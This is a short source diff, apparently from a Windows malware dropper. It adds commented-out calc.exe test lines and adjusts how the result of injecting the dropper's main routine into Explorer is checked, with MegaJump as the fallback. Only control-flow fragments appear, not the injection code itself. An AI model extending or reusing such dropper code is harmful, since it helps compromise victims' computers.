@@ -150,6 +150,10 @@ BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param)
 //---------------------------------------------------------------------
 int APIENTRY LoaderMain() 
 {
+
+//	ShellExecuteA(0, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
+//	ExitProcess(0);
+
 	// Получаем имя дропера
 
 //	EnumWindows(WndEnumCallBak, NULL);
@@ -165,7 +169,7 @@ int APIENTRY LoaderMain()
 
 		bool InExplorer = false;
 		if (!IsWIN64())
-			InExplorer = InjectIntoExplorer(DropperMainProc);
+			InExplorer = InjectIntoExplorer(DropperMainProc) != FALSE;
 		if (!InExplorer)
 			MegaJump(DropperMainProc);
 	} 
